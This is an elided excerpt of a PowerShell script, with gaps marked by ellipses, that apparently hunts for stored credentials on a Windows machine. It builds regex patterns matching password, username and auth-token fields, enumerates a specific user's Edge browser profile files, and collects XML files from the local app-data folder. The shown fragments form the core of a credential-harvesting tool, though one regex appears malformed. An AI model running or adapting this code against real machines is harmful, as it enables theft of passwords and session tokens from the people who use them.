...
[CmdletBinding(PositionalBinding=$false)] param(
   ...
   [string]$Exclude=".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi",
...
If($Exclude -iNotMatch ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi")
{
   ...
   $Exclude = ".zip|.tar|.rar|.7z|.pdf|.img|.iso|.dll|.db|.mp(3|4)|.png|.jpg|.gif|.msi|.exe|.wav|.avi"+"$Exclude" -join ''
}
...
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ...
   $String = "$String" + "|((cp|p)ass.{0,4}`":.{0,22}$)|(`"(Pass.{0,5}|User.{0,4})`">)|(Username`":.{0,22}$)|(`"Auth_token`":)" -join ''
}
...
$EdgeFile = (Gci -Path "C:\Users\pedro\AppData\Local\Microsoft\Edge\User Data"|?{$_.PSIsContainer -eq $false -and $_.Length -gt 0}).FullName
...
$VaultCmd = (Gci -Path "$Env:LOCALAPPDATA"|?{$_.Name -Match '(.xml)$'}).FullName
